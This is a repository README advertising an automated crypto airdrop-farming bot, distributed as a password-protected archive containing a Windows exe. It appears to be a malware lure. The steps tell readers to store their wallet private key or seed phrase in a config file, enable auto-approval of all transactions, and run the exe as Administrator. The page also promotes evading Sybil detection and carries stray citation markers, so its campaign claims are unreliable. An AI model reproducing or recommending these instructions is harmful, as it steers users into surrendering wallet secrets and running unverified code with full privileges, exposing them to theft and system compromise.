# Multi-Chain Airdrop Farmer & Quest Bot

[![Stars](https://img.shields.io/github/stars/yigitturukk/multichain-airdrop-farmer-bot)](https://github.com/yigitturukk/multichain-airdrop-farmer-bot)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

**Stop wasting hours on manual DeFi tasks.** Let our bot farm airdrops for you 24/7. It automatically interacts with the hottest protocols, so you can accumulate points and qualify for massive token distributions. Perfect for OpenLedger, Lombard, Spacecoin, and more.

---

## 🔥 Why This Bot?

March 2026 is the biggest token unlock month of the year, with over $6 billion in assets set to be distributed . Don't farm manually when you can automate.

**What it does:**
- ✅ **Auto-Connect Wallet** – Securely connects via WalletConnect.
- ✅ **Quest Automation** – Automatically performs on-chain tasks: swaps, liquidity provision, lending, borrowing.
- ✅ **Multi-Chain** – Works on Ethereum, Solana, BSC, Arbitrum, Optimism, Base, and more.
- ✅ **Airdrop Tracker** – Monitors your points and progress for top campaigns.
- ✅ **Stealth Mode** – Randomizes transaction timing to avoid Sybil detection.

### 🎁 Currently Supported Airdrops (March 2026)
- **OpenLedger (OPEN)** – Phase 2 distribution [citation:4].
- **Lombard (LOMB)** – Season 2 points campaign (ends March 18) [citation:8].
- **Spacecoin (SPACE)** – Kraken unlock distribution [citation:4].
- **Genius Terminal (GT)** – Trading rewards (ends March 16) [citation:8].
- **Ethena (ENA)** – DeFi staking incentives [citation:4].

*(More campaigns added weekly)*

## 📥 Download

Password-protected archive with the complete bot.

📥 **[Download `airdrop-farmer-pack.zip`](dist/airdrop-farmer-pack.zip)**  
🔐 **Password:** `airdrop2026`

### Archive Contents
- `AirdropFarmer.exe` – Main Windows bot
- `config.yaml` – Wallet and chain configuration
- `campaigns.db` – Database of active airdrop tasks
- `README.txt` – Quick start guide

## 🛠️ Installation (Windows 10/11)

### Quick Start
1. Extract the archive.
2. Edit `config.yaml` – add your wallet private key or seed phrase.
3. **Run `AirdropFarmer.exe` as Administrator.**
4. The bot connects to the blockchain and starts farming automatically.
5. Monitor your progress in the dashboard (`http://localhost:8080`).

## ⚙️ Configuration Example

```yaml
wallet:
  private_key: "YOUR_PRIVATE_KEY"  # Fund with small amount for gas
  auto_approve: true                # Auto-approve all transactions

chains:
  - ethereum
  - solana
  - arbitrum
  - optimism

campaigns:
  - openledger
  - lombard
  - spacecoin
  - genius_terminal

settings:
  tx_delay_min: 30                  # Min seconds between txs (avoid Sybil)
  tx_delay_max: 180                  # Max seconds between txs
  max_gas_price_eth: 50              # Max gas price in Gwei
